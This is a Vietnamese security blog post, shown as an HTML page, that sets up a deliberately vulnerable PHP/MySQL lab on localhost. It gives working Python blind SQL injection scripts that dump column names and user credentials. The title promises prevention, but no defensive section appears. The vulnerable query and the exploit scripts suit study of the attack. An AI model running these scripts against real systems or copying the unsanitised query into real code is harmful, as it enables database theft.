<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        
        Tìm hiểu về SQL injection và cách phòng chống | Cuýt
        
    </title>
    <link rel="stylesheet" href="/css/normalize.min.css">
    <link rel="stylesheet" href="/css/bootstrap-grid-5.3.8.css">
    <link rel="stylesheet" href="/css/fontawesome-7.1.0/css/all.min.css">
    
    <link rel="stylesheet" href="/css/syntax.min.c75db92330d165065b4cef68bb3da371b54ad6f746e9e9047ea56f286749850b.css" integrity="sha256-x125IzDRZQZbTO9ouz2jcbVK1vdG6ekEfqVvKGdJhQs=">
    <link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/svg+xml" href="/images/favicon.svg" />
    <link rel="shortcut icon" href="/images/favicon.ico" />
    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
    <meta name="apple-mobile-web-app-title" content="blog của Cuýt" />
    <link rel="manifest" href="/images/site.webmanifest" />
    <link rel="preload" href="/fonts/JetBrainsMono/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin>
    <script src="/js/fuse.basic.min.js"></script>
    
    <link rel="stylesheet" href="/css/style.min.2e34ac86b95c39dd7d58417fb7805419fa109f94398560bbf2a3356dab1a934b.css" integrity="sha256-LjSshrlcOd19WEF/t4BUGfoQn5Q5hWC78qM1basak0s="><meta name="description" content="Task 2.2 Tạo case SQLi dump data thủ công sex ra sao
"></head>
<body>
    <main id="main" role="main">
        <header id="main-header" class="mt-4">
    <div class="container container-narrow">
        <div class="row align-items-center">
            <div class="col-3">
                <div class="main-header__homepage">
                <a href="/" class="main-header__hompage-link">Cuýt</a>
                </div>
            </div>
            <div class="col-6">
                <nav class="main-header__navbar">
                <ul class="main-header__navbar-list">
                    <li><a href="/">Blog</a></li>
                    <li><a href="/categories">Categories</a></li>
                    <li><a href="/archives">Archives</a></li>
                    <li><a href="/about">About</a></li>
                </ul>
                </nav>
            </div>
            <div class="col-3 text-end">
                <div class="main-header__btn">
                    <div class="main-header_search-wrapper">
                        <i class="fa-solid fa-magnifying-glass main-header__search-icon"></i>
                        <input type="text" class="main-header__search-box" placeholder="Search...">
                        <ul id="main_header__search-results"></ul>
                    </div>
                    <button class="main-header__btn-toggle-theme" type="button" aria-label="Toggle theme">
                        <i class="fa-solid fa-moon" aria-hidden="true"></i>
                    </button>
                </div>
            </div>
        </div>
    </div>
</header>

        <div id="main-content" class="container container-narrow mt-4 mb-4">
            
    <div class="row">
        <article class="main-content__article-detail col-9">
            
                
                <div class="main-content__article-cover">
                    
                </div>
            
        
            <header class="main-content__article-header mb-5">
                <h1 class="main-content__article-title">
                    Tìm hiểu về SQL injection và cách phòng chống
                </h1>
                <div class="main-content__article-meta mt-3">
                    <span>
                        <i class="fa-solid fa-hashtag"></i>
                        
                            
                                
                                <a class="main-content__article-meta-category-link" href="/categories/security">
                                    Security
                                </a>
                            
                                , 
                                <a class="main-content__article-meta-category-link" href="/categories/sql">
                                    SQL
                                </a>
                            
                        
                    </span>
                    <span class="ms-3"><i class="fa-regular fa-calendar"></i> 28/12/2025</span>
                    <span class="ms-3"><i class="fa-regular fa-clock"></i> 3 mins read</span>
                </div>
            </header>
        
            
            
            
            
            
            
            
            
            
            <div class="main-content__article-body-content">
                <h1 id="task-22">Task 2.2</h1>
<blockquote>
<p>Tạo case SQLi dump data thủ công sex ra sao</p>
</blockquote>
<p><a href="https://github.com/quyt0/sqli-cases/tree/main/sqli-dump">Full source code tại đây</a></p>
<h2 id="ý-tưởng-triển-khai">Ý tưởng, triển khai</h2>
<p>Ở đây, ta sẽ tạo một bảng có tên <strong>users</strong> gồm 20 cột, 20 dòng để làm data mẫu. Sau đó sẽ tiến hành dump tất cả dữ liệu bằng cách chèn payload vào đoạn code dính lỗi SQL injection</p>
<p>Sử dụng PHP + MySQL với XAMPP. Dưới đây là chi tiết code triển khai</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">id</span><span class="w"> </span><span class="nb">INT</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">username</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">password</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">-- Tạo 20 cột ...
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">created_at</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">CURRENT_TIMESTAMP</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Đoạn code PHP truy vấn theo trường id dính SQL injection. Trong đó, nếu tìm được data sẽ trả về thẻ <code>&lt;h3&gt;User Info:&lt;/h3&gt;</code>, nếu không trả về <code>No user found.</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Câu truy vấn nhận trực tiếp input của người dùng dẫn tới SQLi
</span></span></span><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users WHERE id = </span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$stmt</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;h3&gt;User Info:&lt;/h3&gt;&lt;pre&gt;&#34;</span> <span class="o">.</span> <span class="nx">print_r</span><span class="p">(</span><span class="nv">$row</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;No user found.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Invalid query.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="dump-dữ-liệu-trong-bảng">Dump dữ liệu trong bảng</h2>
<h3 id="dump-tất-cả-các-cột">Dump tất cả các cột</h3>
<p>Để dump tất cả các cột, ta sẽ dùng dùng <code>LIMIT</code> để lần lượt lấy các cột trong <code>information_schema.columns</code>. Sau đó, với mỗi cột lấy được sẽ dùng <code>ASCII</code> và <code>SUBSTRING</code> để brute-force từng kí tự &ndash;&gt; tìm ra tên cột</p>
<p>Script dump bằng Python</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost/task02/22/index.php&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_req</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">params</span> <span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1 AND </span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;username&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Request error:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_col</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">max_len</span><span class="o">=</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">col_name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
</span></span><span class="line"><span class="cl">        <span class="n">found_char</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;=</span> <span class="n">high</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; LIMIT </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">,1),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">,1))=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">send_req</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">found_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">col_name</span> <span class="o">+=</span> <span class="n">found_char</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; LIMIT </span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">,1),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">send_req</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">found_char</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;#</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">col_name</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">41</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">get_col</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Gọi dump ước chừng 40 cột, ta thấy script dump đến #22 thì hết

  
<figure class="image-container">
  <a href="https://hackmd.io/_uploads/BkmmLzrRkl.png" 
     class="lightbox-trigger" 
     >
      <img src="https://hackmd.io/_uploads/BkmmLzrRkl.png" 
           
           alt="image" 
           class="main-content__article-body-img" 
           loading="lazy" 
      />
  </a>
  
  
</figure></p>
<p>trong đó từ #0 đến #19 là các cột được admin tạo</p>
<h3 id="dump-từng-dòng">Dump từng dòng</h3>
<p>Sau khi đã có tất cả các cột rồi, ta sẽ dump từng dòng cũng bằng phương pháp binary search như trên</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dump_field</span><span class="p">(</span><span class="n">column_name</span><span class="p">,</span> <span class="n">row_index</span><span class="p">,</span> <span class="n">max_len</span><span class="o">=</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">126</span>
</span></span><span class="line"><span class="cl">        <span class="n">found_char</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;=</span> <span class="n">high</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;ASCII(SUBSTRING((SELECT </span><span class="si">{</span><span class="n">column_name</span><span class="si">}</span><span class="s2"> FROM users LIMIT </span><span class="si">{</span><span class="n">row_index</span><span class="si">}</span><span class="s2">,1),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">,1))=</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">send_req</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">found_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">+=</span> <span class="n">found_char</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;ASCII(SUBSTRING((SELECT </span><span class="si">{</span><span class="n">column_name</span><span class="si">}</span><span class="s2"> FROM users LIMIT </span><span class="si">{</span><span class="n">row_index</span><span class="si">}</span><span class="s2">,1),</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">send_req</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">found_char</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>  <span class="c1"># end of string</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">columns</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="s2">&#34;username&#34;</span><span class="p">,</span> <span class="s2">&#34;email&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">row_index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>  <span class="c1"># dump 10 dòng đầu</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">col</span> <span class="ow">in</span> <span class="n">columns</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="n">dump_field</span><span class="p">(</span><span class="n">col</span><span class="p">,</span> <span class="n">row_index</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;    </span><span class="si">{</span><span class="n">col</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Kết quả

  
<figure class="image-container">
  <a href="https://hackmd.io/_uploads/Bkw8_zB0Je.png" 
     class="lightbox-trigger" 
     >
      <img src="https://hackmd.io/_uploads/Bkw8_zB0Je.png" 
           
           alt="image" 
           class="main-content__article-body-img" 
           loading="lazy" 
      />
  </a>
  
  
</figure></p>
            </div>
        
            <div class="article-footer mt-5 pt-4" style="font-size: smaller;">
                <p>Thanks for your reading!</p>
                <p>© 2026 <strong>izcuyt.com</strong>. Some rights reserved.</p>
            </div>
        </article>
        <aside class="main-content__article-panel col-3">
            
            
            <div class="main-content__article-panel-same-category-post">
                <h3 class="main-content__article-panel-heading">
                    <i class="fa-regular fa-newspaper"></i>Related articles
                </h3>
                <ul class="main-content__article-panel-list">
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/" title="Writeup (Web) Cybersecurity Student Contest Vietnam 2025">
                                <span class="main-content__article-panel-item-text">Writeup (Web) Cybersecurity Student Contest Vietnam 2025</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/2025/12/file-upload-challenge/" title="File Upload Challenge">
                                <span class="main-content__article-panel-item-text">File Upload Challenge</span>
                            </a>
                        </li>
                    
                </ul>
            </div>
            

            <div class="main-content__article-panel-categories">
                <h3 class="main-content__article-panel-heading">
                    <i class="fa-solid fa-hashtag"></i> Categories
                </h3>
                <ul class="main-content__article-panel-list">
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/ctf">
                                
                                <span class="main-content__article-panel-item-text">CTF</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/file-uploads-vulnerabilities">
                                
                                <span class="main-content__article-panel-item-text">File Uploads Vulnerabilities</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/security">
                                
                                <span class="main-content__article-panel-item-text">Security</span>
                                <span class="main-content__article-panel-item-text cat-count">(3)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/sql">
                                
                                <span class="main-content__article-panel-item-text">SQL</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/web">
                                
                                <span class="main-content__article-panel-item-text">Web</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/writeups">
                                
                                <span class="main-content__article-panel-item-text">Writeups</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                </ul>
            </div>

            
                <div class="main-content__article-panel-toc">
                    <h3 class="main-content__article-panel-heading">
                        <i class="fa-regular fa-rectangle-list"></i>Contents
                    </h3>
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#ý-tưởng-triển-khai">Ý tưởng, triển khai</a></li>
    <li><a href="#dump-dữ-liệu-trong-bảng">Dump dữ liệu trong bảng</a>
      <ul>
        <li><a href="#dump-tất-cả-các-cột">Dump tất cả các cột</a></li>
        <li><a href="#dump-từng-dòng">Dump từng dòng</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            

        </aside>
    </div>

        </div>

        <footer id="main-footer" class="pt-4 pb-4">
    <div class="container container-narrow border-top pt-5">
        <div class="row">
            <div class="col-lg-5">
                <div class="footer-brand">
                    <h2 class="footer-brand__name">>_ izcuyt.com</h2>
                    <p class="footer-brand__desc">
                        Aspiring Web Pentester<br>Sharing security knowledge about Cyber Security.
                        <br><br>
                        Made by <b>@cuyt</b> with love. ♥️
                    </p>
                </div>
                <div class="footer-socials mt-4">
                    <a href="https://github.com/quyt0"
                        target="_blank" rel="noopener"
                        class="footer-social-btn"
                        aria-label="GitHub profile">
                        <i class="fa-brands fa-github" aria-hidden="true"></i>
                    </a>
                    <a href="https://www.facebook.com/100024860571867"
                        target="_blank" rel="noopener"
                        class="footer-social-btn"
                        aria-label="Facebook profile">
                        <i class="fa-brands fa-facebook" aria-hidden="true"></i>
                    </a>

                    <a href="https://www.instagram.com/koanbunbo/"
                        target="_blank" rel="noopener"
                        class="footer-social-btn"
                        aria-label="Instagram profile">
                        <i class="fa-brands fa-instagram" aria-hidden="true"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/doanduyphuc/"
                        target="_blank" rel="noopener"
                        class="footer-social-btn"
                        aria-label="LinkedIn profile">
                        <i class="fa-brands fa-linkedin" aria-hidden="true"></i>
                    </a>

                    <a href="mailto:dphuc2304@gmail.com"
                        class="footer-social-btn"
                        aria-label="Send email to dphuc2304@gmail.com">
                        <i class="fa-solid fa-envelope" aria-hidden="true"></i>
                    </a>

                    </div>
            </div>

            <div class="col-lg-1 d-none d-lg-block">
                <div class="footer-divider"></div>
            </div>

            <div class="col-6 col-lg-3">
                <h3 class="footer-title">This site</h3>
                <ul class="footer-list">
                    <li><a href="/">Blog</a></li>
                    <li><a href="/categories">Categories</a></li>
                    <li><a href="/archives">Archives</a></li>
                </ul>
            </div>

            <div class="col-6 col-lg-3">
                <h3 class="footer-title">Connect</h3>
                <ul class="footer-list">
                    <li><a href="/cv">Resume</a></li>
                    <li><a href="mailto:dphuc2304@gmail.com">Email</a></li>
                </ul>
            </div>
        </div>
    </div>
</footer>
    </main>
    <div id="lightbox-overlay" class="lightbox-overlay">
        <span class="lightbox-close">&times;</span>
        <img class="lightbox-content" id="lightbox-img">
        <div id="lightbox-caption"></div>
    </div>
    
    <script src="/js/script.min.cf337e7bc69f8ff9a3b5823552a295a01d595a204a8fc3aa3844a7e263db823e.js" integrity="sha256-zzN&#43;e8afj/mjtYI1UqKVoB1ZWiBKj8OqOESn4mPbgj4=" defer></script>
</body>
</html>